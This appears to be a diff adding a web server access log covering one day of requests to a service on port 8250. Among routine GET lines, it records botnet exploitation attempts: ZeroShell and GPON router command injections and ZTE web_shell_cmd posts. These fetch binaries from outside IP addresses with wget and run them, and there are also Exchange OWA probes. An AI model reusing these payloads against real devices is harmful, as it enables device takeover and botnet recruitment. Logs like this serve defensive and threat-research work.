@@ -1,0 +1,55 @@
+[2021-06-05 00:51:17.260] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
+[2021-06-05 01:31:03.187] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Awget+http%3A%2F%2F87.121.98.34%2Fzzz%2Fx86.deathh+-O+%2Ftmp%2Fdata671%0A+chmod+777+%2Ftmp%2Fdata671%0A+%2Ftmp%2Fdata671+zeroshell.x86%0A%27 200 0ms
+[2021-06-05 02:25:30.734] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 03:19:48.505] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://23.95.191.195/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
+[2021-06-05 04:51:46.100] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 04:53:00.969] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 05:04:20.865] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 05:20:50.094] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 05:29:56.532] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 05:29:56.690] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 05:29:56.772] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 1ms
+[2021-06-05 05:34:42.824] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 05:35:17.788] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 05:38:43.355] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 05:53:35.491] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
+[2021-06-05 06:44:37.505] [INFO] - [162.142.125.38] GET http://47.100.89.2:8250/ 200 0ms
+[2021-06-05 06:44:37.878] [INFO] - [162.142.125.38] GET http://47.100.89.2:8250/ 200 0ms
+[2021-06-05 07:14:37.576] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 07:14:39.062] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 07:17:50.667] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 08:31:40.121] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Awget+http%3A%2F%2F87.121.98.34%2Fzzz%2Fx86.deathh+-O+%2Ftmp%2Fdata671%0A+chmod+777+%2Ftmp%2Fdata671%0A+%2Ftmp%2Fdata671+zeroshell.x86%0A%27 200 0ms
+[2021-06-05 08:37:31.485] [INFO] - [47.101.200.37] GET http://47.100.89.2:8250/ 200 0ms
+[2021-06-05 08:48:51.573] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
+[2021-06-05 08:53:35.106] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 08:53:42.180] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 09:43:49.616] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
+[2021-06-05 10:41:00.074] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 10:58:28.116] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 11:24:05.945] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/images/Nxrs4tAtO/HCw4_2FQ7o69dmQEodXU/_2Fua56jJgWqt8tN1Tx/0M9Tus5G1nAOe_2BJflcrm/2nz3T7AxG_2Fd/YnZ7Cn6A/zq1HlKYZhiFyQLgflmvIbb1/yQL2MK3UaK/00uQsiMnxrcs4C9gN/xpGuwRLuq6tH/7YwEr.avi 200 0ms
+[2021-06-05 11:30:27.305] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/images/Nxrs4tAtO/HCw4_2FQ7o69dmQEodXU/_2Fua56jJgWqt8tN1Tx/0M9Tus5G1nAOe_2BJflcrm/2nz3T7AxG_2Fd/YnZ7Cn6A/zq1HlKYZhiFyQLgflmvIbb1/yQL2MK3UaK/00uQsiMnxrcs4C9gN/xpGuwRLuq6tH/7YwEr.avi 200 0ms
+[2021-06-05 11:51:43.324] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
+[2021-06-05 12:15:42.459] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 13:03:30.578] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 15:05:54.602] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 15:24:26.936] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 15:24:27.817] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 15:26:23.593] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 15:34:51.942] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 15:48:34.273] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f 200 0ms
+[2021-06-05 15:50:49.024] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f 200 0ms
+[2021-06-05 16:11:24.076] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 16:39:46.377] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 16:39:46.508] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 16:39:46.557] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 0ms
+[2021-06-05 19:22:33.933] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Awget+http%3A%2F%2F87.121.98.34%2Fzzz%2Fx86.deathh+-O+%2Ftmp%2Fdata671%0A+chmod+777+%2Ftmp%2Fdata671%0A+%2Ftmp%2Fdata671+zeroshell.x86%0A%27 200 0ms
+[2021-06-05 20:36:38.204] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 20:44:01.808] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 20:44:02.674] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 20:48:27.090] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/ 200 0ms
+[2021-06-05 21:14:05.877] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://23.95.191.195/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
+[2021-06-05 21:15:24.372] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 21:34:19.894] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
+[2021-06-05 23:14:49.923] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/web_shell_cmd.gch "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Fresp&CmdAck=" 405 0ms
+[2021-06-05 23:14:50.713] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/web_shell_cmd.gch "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F45.134.8.218%2FKorpze1233121337.mips+-O+%2Fvar%2Ftmp%2Fresp&CmdAck=" 405 0ms
+[2021-06-05 23:14:51.413] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/web_shell_cmd.gch "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Fresp+ztev2&CmdAck=" 405 0ms
